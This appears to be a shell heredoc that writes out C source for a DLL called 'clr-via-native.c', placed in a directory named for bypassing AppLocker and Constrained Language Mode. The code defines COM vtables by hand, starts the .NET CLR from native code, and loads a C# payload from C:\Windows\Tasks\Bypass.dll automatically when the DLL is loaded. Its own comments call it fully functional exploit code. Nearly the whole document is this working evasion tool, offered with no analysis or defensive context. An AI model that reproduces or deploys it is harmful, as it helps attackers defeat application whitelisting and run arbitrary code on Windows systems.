cd "$TARGET_DIR/Applocker-CLM-Bypass"

# Overwrite the file with the complete, fully functional exploit code
cat << 'EOF' > clr-via-native.c
#define COBJMACROS
#include <windows.h>
#include <initguid.h>

// Manually define the standard .NET CLR Engine GUIDs so we don't need metahost.h
DEFINE_GUID(CLSID_CorRuntimeHost,     0xcb2f6723, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0x79, 0x83, 0x54);
DEFINE_GUID(IID_ICorRuntimeHost,       0xcb2f6722, 0xab3a, 0x11d2, 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0x79, 0x83, 0x54);

// Blueprints for the ICorRuntimeHost Vtable
typedef struct ICorRuntimeHost ICorRuntimeHost;
typedef struct ICorRuntimeHostVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICorRuntimeHost *This, REFIID riid, void **ppvObject);
    ULONG (STDMETHODCALLTYPE *AddRef)(ICorRuntimeHost *This);
    ULONG (STDMETHODCALLTYPE *Release)(ICorRuntimeHost *This);
    void *Unused1; 
    HRESULT (STDMETHODCALLTYPE *Start)(ICorRuntimeHost *This);
    HRESULT (STDMETHODCALLTYPE *Stop)(ICorRuntimeHost *This);
    HRESULT (STDMETHODCALLTYPE *CreateDomain)(ICorRuntimeHost *This, LPCWSTR pwcSetupInformation, IUnknown *pIdentity, IUnknown **pAppDomain);
    HRESULT (STDMETHODCALLTYPE *GetDefaultDomain)(ICorRuntimeHost *This, IUnknown **pAppDomain);
} ICorRuntimeHostVtbl;
struct ICorRuntimeHost { ICorRuntimeHostVtbl *lpVtbl; };

// Blueprints for the C# AppDomain Vtable to load assemblies
typedef struct ISmAppDomain ISmAppDomain;
typedef struct ISmAppDomainVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ISmAppDomain *This, REFIID riid, void **ppvObject);
    ULONG (STDMETHODCALLTYPE *AddRef)(ISmAppDomain *This);
    ULONG (STDMETHODCALLTYPE *Release)(ISmAppDomain *This);
    void *Unused[12]; // Padding out unrelated standard methods
    HRESULT (STDMETHODCALLTYPE *Load_2)(ISmAppDomain *This, BSTR assemblyString, void **pRetVal);
} ISmAppDomainVtbl;
struct ISmAppDomain { ISmAppDomainVtbl *lpVtbl; };

// Pure C Exported bypass function
__declspec(dllexport) void LaunchBypass() {
    ICorRuntimeHost *pRuntimeHost = NULL;
    IUnknown *pUnkAppDomain = NULL;
    ISmAppDomain *pDefaultAppDomain = NULL;
    void *pAssembly = NULL;
    
    CoInitialize(NULL);

    // 1. Bootstrap the CLR engine directly via native COM
    if (CoCreateInstance(&CLSID_CorRuntimeHost, NULL, CLSCTX_INPROC_SERVER, &IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost) == S_OK) {
        pRuntimeHost->lpVtbl->Start(pRuntimeHost);
        
        // 2. Grab the active application domain context
        if (pRuntimeHost->lpVtbl->GetDefaultDomain(pRuntimeHost, &pUnkAppDomain) == S_OK) {
            
            // Query for the specific AppDomain interface so we can use its Vtable methods
            // {05F696DC-2B29-3663-AD8B-C4389CF2A713}
            GUID IID_IAppDomain = {0x05f696dc, 0x2b29, 0x3663, {0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13}};
            if (pUnkAppDomain->lpVtbl->QueryInterface(pUnkAppDomain, &IID_IAppDomain, (LPVOID*)&pDefaultAppDomain) == S_OK) {
                
                // 3. Define the path pointing to where your custom C# DLL payload lives on the Windows machine
                BSTR assemblyPath = SysAllocString(L"C:\\Windows\\Tasks\\Bypass.dll");
                
                // 4. Force the .NET Engine to load the C# code directly into memory
                pDefaultAppDomain->lpVtbl->Load_2(pDefaultAppDomain, assemblyPath, &pAssembly);
                
                SysFreeString(assemblyPath);
                pDefaultAppDomain->lpVtbl->Release(pDefaultAppDomain);
            }
            pUnkAppDomain->lpVtbl->Release(pUnkAppDomain);
        }
        pRuntimeHost->lpVtbl->Release(pRuntimeHost);
    }
    CoUninitialize();
}

// Standard DLL Entrypoint
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        LaunchBypass();
    }
    return TRUE;
}
